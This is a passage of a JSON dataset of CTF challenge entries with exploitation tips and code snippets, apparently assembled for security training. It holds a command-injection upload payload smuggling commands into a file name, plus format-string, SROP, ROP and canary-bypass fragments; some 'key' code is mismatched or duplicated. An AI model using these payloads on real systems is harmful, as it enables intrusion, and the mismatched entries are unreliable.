            "In scenarios where the application combines user input with system commands or file paths, ensure to check all input sanitization mechanisms (e.g., PHP's `basename()` or `escapeshellarg()`, Python's `subprocess.list2cmdline()`, Windows filesystem restrictions) to identify any potential bypasses. Characters like spaces, tabs, commas, semicolons, and equal signs might be interpreted differently by various processors (e.g., `cmd.exe`), allowing argument injection even with restrictions in place. This knowledge can be exploited by structuring commands or file names in a way that bypasses input filtering and leads to unintended command execution. An example could be crafting a payload that utilizes known filename sanitization bypasses to execute arbitrary commands or access restricted directories.\n\n   Example payload for bypassing space restrictions and accessing higher directory levels in a command injection vulnerability: `curl -F 'file=@/path/to/dicom_jpeg;filename=x&cd..&cd..&dir&x' 'http://vulnerable.site/upload'`"
        ],
        "key": "```php\n<?php\nif ($_FILES[\"file\"][\"size\"] > 1000000)\n    die(\"file too large\");\nset_time_limit(15);\nini_set('max_execution_time', 15);\n$name = \"C:/upload/\" . basename($_FILES[\"file\"][\"name\"]);\nmove_uploaded_file($file[\"tmp_name\"], $name);\nsystem(\"python getsize.py \".escapeshellarg($name));\nunlink($name);\ndie();\n?>\n```\n\n```python\nimport sys, imageio\nassert imageio.__version__ == '2.5.0'\nprint('(w, h) =', imageio.imread(sys.argv[1]).shape[:2])\n```\n\n```python\nimport subprocess\nsubprocess.check_call([exe, fname1, fname2], shell=True)\n```"
    },
    {
        "name": "Silk Road I",
        "write_up": "dataset/raw/Silk Road I.md",
        "type": "pwn",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 83,
        "max_score": 500,
        "difficulty": 0.166,
        "knowledge": [
            "In binary exploitation challenges involving obfuscated constraints and computations from user input, employing a mixed approach of both static and dynamic analysis can lead to a more efficient solution. Here, static analysis (using tools like Ghidra and Binary Ninja) is used initially to understand the constraints and logic of the binary. Dynamic analysis (using custom scripts and patching binaries for instrumentation) can then be applied for experimenting with inputs in a controlled environment. This approach is beneficial when confronting binaries that implement unconventional behavior, such as handling leading zeros in inputs differently. Dynamic analysis, in this case, revealed that leading zeros could cause a divide by zero exception, which might not have been easily discovered through static analysis alone.",
            "When dealing with non-standard execution environments or when library functions fail due to incorrect offsets, direct manipulation of machine code and memory can be a workaround. This involves tasks such as mmap'ing binary code into memory, marking it as executable, and manually patching in jumps to correct library function offsets using placeholder nops or customized jump instructions (`mov rax, address; jmp rax`). Although tedious, this method allows for execution of hand-crafted or extracted binary blobs within a different binary or execution context. This technique proves useful in situations where the standard linking or execution flow of a binary has been altered or is being emulated."
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main() {\n    char input[100];\n    long value;\n    \n    printf(\"Enter the magic value: \");\n    fgets(input, sizeof(input), stdin);\n    \n    // Vulnerability: strtol and strlen used without proper validation\n    value = strtol(input, NULL, 10);\n    if (strlen(input) > 10) {\n        printf(\"Divide by zero error!\\n\");\n        return 1;\n    }\n    \n    // Simulated constraint checks\n    if (value % 6 == 0) {\n        printf(\"Constraint 1 passed\\n\");\n    }\n    if (value % 5 == 0) {\n        printf(\"Constraint 2 passed\\n\");\n    }\n    if (value % 4 == 0) {\n        printf(\"Constraint 3 passed\\n\");\n    }\n    if (value % 3 == 0) {\n        printf(\"Constraint 4 passed\\n\");\n    }\n    if (value % 2 == 0) {\n        printf(\"Constraint 5 passed\\n\");\n    }\n    if (value % 1 == 0) {\n        printf(\"Constraint 6 passed\\n\");\n    }\n    \n    return 0;\n}\n```"
    },
    {
        "name": "Silk road II",
        "write_up": "dataset/raw/Silk road II.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 171,
        "max_score": 500,
        "difficulty": 0.342,
        "knowledge": [
            "When facing a brute-force challenge where the secret is a numeric string, consider implementing a direct brute-force attack by iterating over possible values, converting them to strings, and testing each against the provided verification function. This approach is particularly effective when the search space is relatively small, allowing the brute-force attack to complete in a reasonable timeframe.",
            "In challenges involving stack overflows and format string vulnerabilities, bypassing protections like stack canaries may be possible by carefully crafting inputs that exploit the function's behavior without altering sensitive memory areas. For instance, providing input that causes a `scanf`-like function to return early without writing to a buffer can maintain the integrity of the canary, enabling a stack overflow without triggering security mechanisms. \n\n    Example payload for bypassing canary protection using an invalid floating point number with `scanf`: Send \"-\" as the input to prevent overwriting the canary, followed by a carefully constructed overflow payload that respects the untouched canary value."
        ],
        "key": "```c\nvoid clear_stack()  \n{  \n\tchar buf[0x1000];  \n\tmemset(buf, 0, sizeof(buf));  \n}\n\nint main(int argc, char const *argv[])  \n{  \n\tchar* addr = *(char**)dlopen(\"./silkroad_2.elf\", RTLD_NOW | RTLD_GLOBAL);  \n\tfunc_t f = (func_t)(addr + 0x1C06);  \n\tfor (int i = 0; i < 0x3b9aca00; ++i)  \n\t{  \n\t\tsprintf(buf, \"%.9d\", i);  \n\t\tfor (int i = 0; i < 4; ++i)  \n\t\t{  \n\t\t\tkey[i] = buf[i];  \n\t\t}  \n\t\tfor (int i = 0; i < 5; ++i)  \n\t\t{  \n\t\t\tkey[6 + i] = buf[4 + i];  \n\t\t}  \n\t\tkey[4] = '1';  \n\t\tkey[5] = '1';//4,5 must be length, which is always 11  \n\t\tkey[11] = 0;  \n\t\tclear_stack();  \n\t\tif (f(key) == 1)  \n\t\t\tputs(buf);  \n\t}  \n\treturn 0;  \n}\n```"
    },
    {
        "name": "Silk road III",
        "write_up": "dataset/raw/Silk road III.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 182,
        "max_score": 500,
        "difficulty": 0.364,
        "knowledge": [
            "When encountering a situation where a CTF challenge involves cracking a numeric string, consider employing a brute-force approach if the secret is numeric and the search space is not overly large. This is viable when the constraint within the challenge logic reduces the possible range of values significantly, making a brute-force search computationally feasible.",
            "When exploiting a format string vulnerability to achieve arbitrary code execution or leak memory contents, one can use a combination of `%p` for pointer leaks to determine base addresses, and `%n` or variations thereof (like `%hn`, `%hhn`) for writing arbitrary values to memory by controlling the format string input. The exploit development process involves identifying writable addresses (e.g., GOT entries), calculating desired values to overwrite these addresses with (e.g., `system()` address), and crafting payloads that use the format string vulnerability to make these overwrites. This approach can be demonstrated in scenarios where error messages containing user-controlled input are printed without proper sanitization.\n   \n   Example payload using format string to overwrite GOT entry:\n   ```\n   payload = fmtstr_payload(offset, {got_puts: libc_system}, write_size='short')\n   ```\n   This hypothetical payload would use an automated tool like Python's `fmtstr_payload` from the `pwntools` library to generate a format string that writes the address of `libc_system` into the Global Offset Table (GOT) entry of `puts`, effectively redirecting calls to `puts` to `system`. The `offset` parameter signifies the position in the format string where the written value starts, and `{got_puts: libc_system}` is a dictionary mapping the target memory address (`got_puts`) to the value to write there (`libc_system`). The `write_size='short'` argument specifies that each write operation should use two bytes at a time, suitable for `%hn`."
        ],
        "key": "```c\n#include <stdio.h>  \n#include <dlfcn.h>  \n#include <memory.h>  \ntypedef int (*func_t)(char *);  \nchar buf[0x100];  \nchar key[0x100];\n\n//to clear the stack of verification function,  \n//because use of `strncpy` will cause uninitialized variable access (no null\nterminate)  \n//which causes unexpected results if `strcat` is called to that string later  \nvoid clear_stack()  \n{  \n\tchar buf[0x1000];  \n\tmemset(buf, 0, sizeof(buf));  \n}\n\nint main(int argc, char const *argv[])  \n{  \n\tchar* addr = *(char**)dlopen(\"./silkroad_2.elf\", RTLD_NOW | RTLD_GLOBAL);  \n\tfunc_t f = (func_t)(addr + 0x1C06);  \n\tfor (int i = 0; i < 0x3b9aca00; ++i)  \n\t{  \n\t\tsprintf(buf, \"%.9d\", i);  \n\t\tfor (int i = 0; i < 4; ++i)  \n\t\t{  \n\t\t\tkey[i] = buf[i];  \n\t\t}  \n\t\tfor (int i = 0; i < 5; ++i)  \n\t\t{  \n\t\t\tkey[6 + i] = buf[4 + i];  \n\t\t}  \n\t\tkey[4] = '1';  \n\t\tkey[5] = '1';//4,5 must be length, which is always 11  \n\t\tkey[11] = 0;  \n\t\tclear_stack();  \n\t\tif (f(key) == 1)  \n\t\t\tputs(buf);  \n\t}  \n\treturn 0;  \n}\n```"
    },
    {
        "name": "Simple SPN",
        "write_up": "dataset/raw/Simple SPN.md",
        "type": "crypto",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 766,
        "max_score": 906,
        "difficulty": 0.8454746136865342,
        "knowledge": [
            "In a cryptographic challenge involving substitution-permutation networks (SPN) with the square property, by crafting a set of plaintexts where all entries are identical except for a single byte, and then encrypting these plaintexts, one can leverage the square property to simplify the process of cracking the encryption. This approach works because if you encrypt 256 plaintexts that differ in only one position, the output ciphertexts for that position will cycle through every possible byte value. This method is particularly useful when attempting to reverse engineer or break down the encryption process in stages, such as identifying the last XOR key applied in an SPN encryption scheme.",
            "When trying to determine the value of unknown bytes in a cryptographic key or to reverse an encryption process where multiple potential values are identified for each byte, interleave analyses on different datasets. This can be done by encrypting sets of plaintexts that have been padded with different characters, generating candidates for the unknown key bytes from each set. Then, intersect the sets of candidate values generated from each dataset. The logic is that the actual byte value will consistently appear in all candidate sets, while incorrect values will vary and thus can be filtered out. This method is effective in scenarios where an encryption mechanism generates many false positives in the process of key recovery. \n\nExample of generating and filtering candidates:\n```python\ndef integrate(index, ciphertexts, invsbox):\n    potential = set()\n    for candidateByte in range(256):\n        sum = 0\n        for ct in ciphertexts:\n            t = ct[index] ^ candidateByte # invert xor\n            s = invsbox[t] # invert sbox\n            sum ^= s\n        if sum == 0:\n            potential.add(candidateByte)\n    return potential\n\n# Assuming the invsbox (inverse S-box) and ciphertexts have been defined elsewhere\ncandidates_each_byte = [integrate(i, ciphertexts, invsbox) for i in range(8)]\n# Further processing to filter and determine the correct byte values\n```\nThis approach narrows down the search for the correct byte values in cryptographic key recovery efforts, making it feasible to dissect complex encryption mechanisms in a stepwise and efficient manner."
        ],
        "key": "```python  \nba_block = self.bytes_to_bitarray(block, self.BLOCK_SIZE*8)\n\nfor _round in range(self.ROUNDS-1):  \n   ba_block = self.keyXor(ba_block, self.keys[_round])  \n   ba_block = self.substitute(ba_block)  \n   ba_block = self.permutation(ba_block)  \n#last round is not permuted  \nba_block = self.keyXor(ba_block, self.keys[self.ROUNDS-1])  \nba_block = self.substitute(ba_block)\n\nba_block = self.keyXor(ba_block, last_XOR_key)  \nout += '%016x' % b2l(self.bitarray_to_bytes(ba_block, 8))  \n```"
    },
    {
        "name": "Simple XOR",
        "write_up": "dataset/raw/Simple XOR.md",
        "type": "crypto",
        "competition": [
            "UrchinSec/2024",
            "https://ctftime.org/event/2327/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "In challenges involving simple XOR encryption, if the key is a single character, one can decrypt the message by XORing the encrypted data with the key. This is because XOR encryption is reversible using the same key. Here, 'a' (ASCII 97) is used as the key. To manually decrypt without the original key, you can brute-force the key by trying all possible character values (typically in the range of printable ASCII characters) until the decrypted text makes sense.\n   \n   Example for manual decryption without original key (pseudo-code):\n   ```python\n   encrypted_hex = \"0c0b1a111017...\"  # The encrypted data in hex format.\n   encrypted_bytes = bytes.fromhex(encrypted_hex)\n   for key_candidate in range(256):  # Trying all byte values as potential keys.\n       decrypted = ''.join(chr(byte ^ key_candidate) for byte in encrypted_bytes)\n       if \"flag_format_here\" in decrypted:  # Assuming you know the flag format.\n           print(f'Found with key {key_candidate}:', decrypted)\n           break\n   ```",
            "When working with XOR encryption in a CTF challenge, and if a specific part of the plaintext is known (e.g., the flag format 'urchinsec{'), you can use this known plaintext to recover the key, assuming the key is short and reused for encryption. This process is known as a known-plaintext attack (KPT). In the given case, since the key is just one character, XORing the known part of the plaintext with the corresponding part of the ciphertext will directly give you the key.\n\n   Example for finding the key with known plaintext:\n   ```python\n   known_plaintext = \"urchinsec{\"\n   encrypted_hex = \"0c0b1a111017...\"  # The start of the encrypted data in hex.\n   encrypted_bytes = bytes.fromhex(encrypted_hex)\n   key = ord(known_plaintext[0]) ^ encrypted_bytes[0]  # Using the first character for simplicity.\n   print(f\"Recovered key: {chr(key)}\")\n   ```"
        ],
        "key": "```python\nmessage = 'urchinsec{fake_flag}' # message comes here  \nkey = 'a' # key comes here  \nencrypted = ''.join([chr(ord(x) ^ ord(key)) for x in message])  \nwith open(\"enc\", \"w\") as enc:  \n   enc.write(encrypted)\n\nprint(\"encrypted\")  \n```"
    },
    {
        "name": "Skipping the Ropes",
        "write_up": "dataset/raw/Skipping the Ropes.md",
        "type": "crypto",
        "competition": [
            "eHaCON/2021",
            "https://ctftime.org/event/1494/tasks/"
        ],
        "score": 25,
        "max_score": 125,
        "difficulty": 0.2,
        "knowledge": [
            "When faced with an encoded file or message in a CTF challenge and suspecting a Caesar cipher, one can decode it using ROT13 or other Caesar shifts if the ROT13 attempt does not reveal readable text. ROT13 is a special case of the Caesar cipher which shifts letters by 13 places in the alphabet. Online tools such as CyberChef or dcode.fr can be utilized for quick decryption without the need to write custom scripts.",
            "The choice of ROT13 or any specific shift, like in the challenge \"Skipping the Ropes\", should be based on hints within the challenge description or file names that suggest a relationship with Caesar or the ROT cipher family. This strategy reduces the time spent on trial and error across numerous possible encryption methods by targeting a likely encryption technique based on the context provided.\n\nExample payload for ROT13: Using online tool CyberChef or dcode.fr, input `RUNPBA{3AP0Q3Q_J1GU_E0G}` to receive `EHACON{3NC0D3D_W1TH_R0T}` as the output."
        ],
        "key": "```python\ndef caesar_cipher_decrypt(ciphertext, shift):\n    decrypted_text = \"\"\n    for char in ciphertext:\n        if char.isalpha():\n            shift_amount = 13 if char.islower() else 13\n            new_char = chr((ord(char) - shift_amount - 65) % 26 + 65)\n            decrypted_text += new_char\n        else:\n            decrypted_text += char\n    return decrypted_text\n\nciphertext = \"RUNPBA{3AP0Q3Q_J1GU_E0G}\"\nprint(caesar_cipher_decrypt(ciphertext, 13))\n```"
    },
    {
        "name": "Skywriting v2",
        "write_up": "dataset/raw/Skywriting v2.md",
        "type": "The type of this CTF challenge is crypto.",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": 460,
        "max_score": 500,
        "difficulty": 0.92,
        "knowledge": [
            "In challenges involving encrypted content, if the encryption method involves XOR and the flag format is known (e.g., starting with a known pattern), an effective starting point is to XOR the known character of the flag with the corresponding encrypted character. This can provide the key needed to begin decrypting the flag. Example approach: If the flag format starts with 'h' and the encrypted content starts with '.', XOR these two ('.' ^ 'h') to find the key for initial decryption steps.",
            "When partial decryption reveals part of the flag correctly but other parts are still encrypted, it indicates a multiple XOR key encryption might be involved. In such scenarios, identifying parts of the decrypted content that are expected to conform to a known pattern (e.g., common words or flag format segments) can help determine additional XOR keys. This involves guessing the plain text for a segment, XORing the guessed character with the decrypted character at the corresponding position to find the new key, and applying it to subsequent characters. Example adjustment: If decryption reveals \"iTs_sUpl[\" and the guess for the next character is 'e', XOR the decrypted character 'l' with 'e' to find the next XOR key, then continue decryption."
        ],
        "key": "```python\ndef xor_decrypt(encrypted_flag, key):\n    decrypted = ''\n    for i in range(len(encrypted_flag)):\n        decrypted += chr(encrypted_flag[i] ^ key[i % len(key)])\n    return decrypted\n\nencrypted_flag = b'.5%2 =/\\x125\\x195\\x136*\\x1d\\x10 -Q,yc\\x168'\nkey = b'Rifle'  # Example key based on the hint\n\ndecrypted_flag = xor_decrypt(encrypted_flag, key)\nprint(decrypted_flag)\n```"
    },
    {
        "name": "Slicense",
        "write_up": "dataset/raw/Slicense.md",
        "type": "web",
        "competition": [
            "KipodAfterFree/2019",
            "https://ctftime.org/event/945/tasks/"
        ],
        "score": 60,
        "max_score": 100,
        "difficulty": 0.6,
        "knowledge": [
            "When analyzing reverse engineering challenges involving apps, especially those with a GUI component, jadx can be used for disassembly to locate relevant code segments easily, such as function calls and string references that interact with the UI. This is particularly useful for identifying areas of interest, like JavaScript interfaces or specific functions that validate input.",
            "In challenges that involve encryption, specifically AES/CBC with no padding, static keys or initialization vectors (IVs) can sometimes be identified through dynamic analysis tools like Frida by hooking into encryption and decryption functions. Once the static key and IV are known, decryption of values processed by the app can be performed to reveal hidden messages or inputs necessary for challenge completion.\n   \n   Example static IV or key: `F00Bar?!F00Bar?!`"
        ],
        "key": "```java\npublic boolean a(String input) {\n    String[] parts = input.split(\"-\");\n    if (parts.length != 8) {\n        return false;\n    }\n    for (String part : parts) {\n        if (part.length() != 4) {\n            return false;\n        }\n        char firstByte = part.charAt(0);\n        char secondByte = part.charAt(1);\n        char thirdByte = part.charAt(2);\n        char derivedByte = part.charAt(3);\n        if (firstByte != 'F' || secondByte != '0' || thirdByte != '0' || derivedByte != (secondByte ^ thirdByte)) {\n            return false;\n        }\n    }\n    return true;\n}\n```"
    },
    {
        "name": "Slide To The Left",
        "write_up": "dataset/raw/Slide To The Left.md",
        "type": "crypto",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 350,
        "max_score": 500,
        "difficulty": 0.7,
        "knowledge": [
            "When dealing with AES-CBC encryption, a padding oracle attack allows for decrypting the ciphertext without needing the encryption key. This attack manipulates the initialization vector (IV) and observes the decryption outputs to infer back the original plaintext. This technique leverages the fact that changes in the IV will affect the decryption of the first block of ciphertext in a predictable way, enabling an attacker to guess the plaintext by observing error messages or changes in output.",
            "For executing a successful padding oracle attack in challenges involving AES-CBC, it is crucial to interact with an oracle that provides detailed feedback (errors, success messages) on decryption attempts. This feedback, when the decryption process involves incorrect padding, helps in adjusting the attack payloads (IV and ciphertext) to correctly guess the plaintext byte by byte. An important condition for the success of such attacks is the presence of detailed error messages or distinguishable outputs based on the padding correctness.\n   \nExample Payload Adjustment for IV (Initialization Vector):\n```python\noriginal_iv = b'\\x94\\xd0g\\xa3e\\xb5\\x1d\\xa0X\\x9f\\x8b\\xa2\\xeeg\\xfd\\xd6'\nadjusted_iv = bytearray(original_iv)\n# Adjust individual bytes of the IV here based on oracle feedback\nadjusted_iv[0] = adjusted_iv[0] ^ 0x01 # Example adjustment based on feedback\n```"
        ],
        "key": "```python\nfrom Crypto.Cipher import AES\n\ndef decrypt(ciphertext, iv, key):\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    plaintext = cipher.decrypt(ciphertext)\n    return plaintext\n\n# Example of vulnerable decryption usage\niv = b'\\x94\\xd0g\\xa3e\\xb5\\x1d\\xa0X\\x9f\\x8b\\xa2\\xeeg\\xfd\\xd6'\nciphertext = b'z\\x8d4A\\xfd<\\'\\x8d4\\xf0\\xaf\\xef]\\xb6\\xd2\\x88\\x1b\\x1b\\xce\\x9b\\xa1\\xb4\\xf5!\\xd3M\\xcf*Ge\\x15\\x04\\xfb$\\xa5\\x18\\x1d\\xef?\\xea\\xbe\\xa8/U\\x88\\xe70\\xa9E\\x8a\\xd7@\\xe3\\nl\\xa3\\xcb\\xa7\\xd00\\x17\\x9ew\\x99U\\x90\\xb7\\xe8u\\xc2\\xbf:\\x0e\\xa8\\xf5\"\\x83\\x0f\\xe0\\xa3$\\xb3I\\x03\\x11\\xfd\\xcbc\\xd6cE\\x85\\xad\\xb2K\\x07'\nkey = b'Sixteen byte key'\n\nplaintext = decrypt(ciphertext, iv, key)\nprint(plaintext)\n```"
    },
    {
        "name": "Slots",
        "write_up": "dataset/raw/Slots.md",
        "type": "reverse",
        "competition": [
            "KITCTFCTF/2022",
            "https://ctftime.org/event/1810/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing a binary for vulnerabilities or specific behaviors, starting from a point of interest such as a function that interacts with a critical file (e.g., reading a \"flag.txt\") can be effective. This approach involves backtracking from the point of interest to understand the conditions and logic that lead to its execution. Developers can utilize this strategy to identify the critical code paths that need to be addressed or manipulated for exploitation or debugging.",
            "For challenges that involve predicting or influencing pseudo-random number generation, identifying the seed initialization function such as `srand()` is crucial. Once identified, an attacker can attempt to control or predict the output of `rand()` by manipulating the seed. This can often be achieved through bruteforcing or reverse engineering the seed generation logic. In cases where direct manipulation is complex or impossible, using symbolic execution tools like Z3 can be a powerful technique to solve for the necessary input values to achieve the desired state or output. This approach is particularly useful in challenges where inputs are obfuscated or transformed in non-trivial ways before affecting the program's state.\n\nExample payload when manipulating `srand()` for predictable `rand()` output:\n```cpp\nunsigned int target_seed = 0; // Assume you've calculated the correct seed.\nsrand(target_seed);\nint predictable_rand = rand(); // This call to rand() will now produce a predictable result.\n```"
        ],
        "key": "```cpp\n#include <iostream>\n#include <cstdlib>\n#include <ctime>\n\nstruct GameState {\n    bool gameWon;\n    int value;\n};\n\nvoid initializeGameState(GameState &state, bool win) {\n    if (win) {\n        state.gameWon = true;\n        state.value = 1234; // Winning condition\n    } else {\n        state.gameWon = false;\n        state.value = rand() % 1000; // Random game state\n    }\n}\n\nvoid printResult(const GameState &state) {\n    if (state.gameWon) {\n        std::cout << \"You won! Flag: actf{fruity}\" << std::endl;\n    } else {\n        std::cout << \"You lost. Try again!\" << std::endl;\n    }\n}\n\nint main() {\n    srand(time(0)); // Seed the random number generator\n    GameState state;\n    initializeGameState(state, false); // Initialize with a losing state\n    printResult(state);\n    return 0;\n}\n```"
    },
    {
        "name": "Slowest Fastest",
        "write_up": "dataset/raw/Slowest Fastest.md",
        "type": "pwn",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with a dynamic programming problem, particularly one that requires optimizing certain actions (like allocating tasks to different types of workers to minimize time), using numpy for mathematical operations and array manipulations can significantly enhance performance. This approach is particularly beneficial in scenarios where you need to process large datasets or perform complex calculations under time constraints.",
            "In scenarios where you have to deal with a slow connection or a tight time limit for sending responses (like the 60 seconds in this challenge), precomputing as much as possible before entering the main interaction loop can be crucial. Specifically, calculating the sequence of actions or operations beforehand and then quickly iterating through them to generate the required output for each step or test case. This method ensures that your solution remains within the time limit while dealing with interactive problems.\n\nExample payload (conceptual, related to optimization and pre-computation strategies, not directly applicable as a command):\n```python\nroomsGifts = [v1]  \nfor x in range(1,N):  \n    giftsForRoom = (a * roomsGifts[-1] + c) % mod  \n    roomsGifts.append(giftsForRoom)\nroomsGifts = -np.sort(-np.array(roomsGifts))\n```"
        ],
        "key": "```python\ndef work(roomsGifts, bots, counter, iteration):  \n    fastBotsAmount = bots[\"fastBots\"][\"amount\"]  \n    fastBotsGifts = bots[\"fastBots\"][\"giftsPerDay\"]  \n    slowBotsGifts = bots[\"slowBots\"][\"giftsPerDay\"]\n\n    firstPart = roomsGifts[:fastBotsAmount]  \n    secondPart = roomsGifts[fastBotsAmount:]\n\n    currentCounter = counter + 1  \n    if (iteration < 17):  \n        firstItem = roomsGifts[0]  \n        mult = math.floor(firstItem / fastBotsGifts)  \n        mult = math.floor(mult / 3)  \n        a = np.subtract(firstPart, fastBotsGifts * mult)  \n        b = np.subtract(secondPart, slowBotsGifts * mult)\n\n        currentCounter = counter + mult  \n    else:  \n        a = np.subtract(firstPart, fastBotsGifts)  \n        b = np.subtract(secondPart, slowBotsGifts)\n\n    temp = np.concatenate([a, b])  \n    leftGifts = filter_nonzero(temp, 0)  \n\n    if (len(leftGifts) == 0):  \n        return counter\n\n    leftGifts = -np.sort(-leftGifts)\n\n    return work(leftGifts, bots, currentCounter, iteration + 1)\n```"
    },
    {
        "name": "Small Inscription",
        "write_up": "dataset/raw/Small Inscription.md",
        "type": "crypto",
        "competition": [
            "DanteCTF/2023",
            "https://ctftime.org/event/2000/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When encountering RSA encryption in CTF challenges where the public exponent `e` is notably small (e.g., e=3), a Low Exponent Attack can be applied efficiently. This is because the small exponent makes it feasible to compute the cube root of the ciphertext, potentially directly revealing the plaintext if `pow(m,e) < N`. This method is relevant in scenarios where RSA is used with small public exponents and the encryption does not fully exploit the modulus size.",
            "If the direct cube root of the ciphertext does not yield the plaintext (likely because `pow(m,e) \u2265 N`), the ciphertext `ct` can be adjusted by iteratively adding multiples of the modulus `N` (i.e., calculating the cube root of `ct + kN` for some integer `k`) until the plaintext is recovered. This approach is necessary when the original message, once encrypted, is comparable to or exceeds the modulus in size, a condition often met in practical RSA encryption scenarios. \n\nSample approach to adjust and recover the plaintext:\n\n```python\nfrom gmpy2 import iroot\n\nct = <ciphertext>\nn = <modulus>\nk = 0\n\nwhile True:\n    adjusted_ct = ct + k * n\n    m, is_exact = iroot(adjusted_ct, 3)\n    if is_exact:\n        print(f'Plaintext: {m}')\n        break\n    k += 1\n```\n\nThis snippet represents the concept without specific values, where `<ciphertext>` and `<modulus>` should be replaced with the actual `ct` and `n` values from the challenge."
        ],
        "key": "```python  \n#!/usr/bin/env python3\n\nfrom Crypto.Util.number import bytes_to_long, getPrime  \nfrom secret import FLAG  \nassert len(FLAG) < 30  \nif __name__ == '__main__':  \n   msg = bytes_to_long(b'There is something reeeally important you should know, the flag is '+FLAG)  \n   N = getPrime(1024)*getPrime(1024)  \n   e = 3  \n   ct = pow(msg, e, N)  \n   print(f'{ct=}')  \n   print(f'{N=}')  \n```"
    },
    {
        "name": "small_boi",
        "write_up": "dataset/raw/small_boi.md",
        "type": "pwn",
        "competition": [
            "CSAW/2019/Quals",
            "https://ctftime.org/event/870/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "For exploiting binaries with limited instructions and without linked libc, leveraging a syscall to perform a Sigreturn Oriented Programming (SROP) attack can be effective. This technique is applicable particularly when the binary has a `syscall` instruction and a way to control the stack (e.g., through a buffer overflow), allowing for the execution of arbitrary code despite Non-Executable (NX) stack protections. In scenarios where the binary contains a function that initiates a sigreturn syscall (`syscall; ret` pattern), crafting a signal frame on the stack can be utilized to gain control over the program's execution flow. \n\nExample payload component: `sigreturn = p64(0x40017c)  # Address of function initiating sigreturn syscall`",
            "If the binary being exploited contains strings or other data useful for exploitation (e.g., \"/bin/sh\" for spawning a shell), these can be incorporated into the payload to perform system calls, such as `execve`, without the need to find or inject these strings elsewhere. This method is specifically valuable in environments where writing or injecting additional data is constrained or not possible. The presence of such strings within the binary can complement SROP and other exploit techniques by providing necessary arguments for syscalls directly from the binary's memory space.\n\nExample payload component: `frame.rdi = 0x4001ca  # Address of \"/bin/sh\" within the binary`"
        ],
        "key": "```assembly\nundefined FUN_0040018c()  \n    undefined         AL:1           <RETURN>  \n    undefined1        Stack[-0x28]:1 local_28                                XREF[1]:     00400190(*)    \n                        FUN_0040018c                                    XREF[3]:     entry:004001b6(c), 004001e8,  \n                                                                                         00400238(*)    \n   0040018c 55              PUSH       RBP  \n   0040018d 48 89 e5        MOV        RBP,RSP  \n   00400190 48 8d 45 e0     LEA        RAX=>local_28,[RBP + -0x20]  \n   00400194 48 89 c6        MOV        RSI,RAX  \n   00400197 48 31 c0        XOR        RAX,RAX  \n   0040019a 48 31 ff        XOR        RDI,RDI  \n   0040019d 48 c7 c2        MOV        RDX,0x200  \n            00 02 00 00  \n   004001a4 0f 05           SYSCALL  \n   004001a6 b8 00 00        MOV        EAX,0x0  \n            00 00  \n   004001ab 5d              POP        RBP  \n   004001ac c3              RET  \n```"
    },
    {
        "name": "SMM Cowsay 2",
        "write_up": "dataset/raw/SMM Cowsay 2.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2022",
            "https://ctftime.org/event/1600/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In a challenge concerning buffer overflows within a structured data communication handler, specifically in scenarios involving SMM (System Management Mode) with restricted memory access, an overflow can be triggered by sending a payload that exceeds allocated bounds. This overflow can lead to the corruption of adjacent memory data, such as function pointers. This corruption can be leveraged to gain control of the instruction pointer (RIP) and execute arbitrary code. Essential to this approach is ensuring that the payload size precisely matches the overflow requirements to corrupt specific targets, like function pointers, without affecting unrelated memory areas. \n   \n   Example payload structure for triggering the overflow and corrupting a function pointer: \n   ```python\n   payload = 'A'.encode('utf-16-le') * 200 + p64(address_of_controlled_data)\n   ```",
            "For executing a ROP (Return-Oriented Programming) chain in environments where direct memory access might be restricted or specific protections are engaged (like CR0 write protection in SMM), an intermediary gadget can be utilized to adjust the stack pointer (RSP) to a controlled area in memory filled with subsequent ROP gadgets and payloads. This method is especially useful in scenarios where initial exploitation provides limited control over program execution flow or where direct execution of shellcode is not feasible due to memory protection mechanisms. The selection of an initial gadget to adjust the RSP plays a crucial role in ensuring the continuity of the ROP chain execution.\n\n   Example of using an intermediary gadget to adjust RSP for a ROP chain:\n   ```python\n   # Assuming 'ret_0x70' is an address of a gadget 'ret 0x70' that adjusts RSP by adding 0x70 before returning\n   # The gadget's purpose is to move RSP to a controlled area filled with further ROP gadgets\n   payload += p64(ret_0x70)\n   # Followed by the rest of ROP chain placed at the controlled stack area\n   payload += p64(gadget1) + p64(gadget2) + ...\n   ```"
        ],
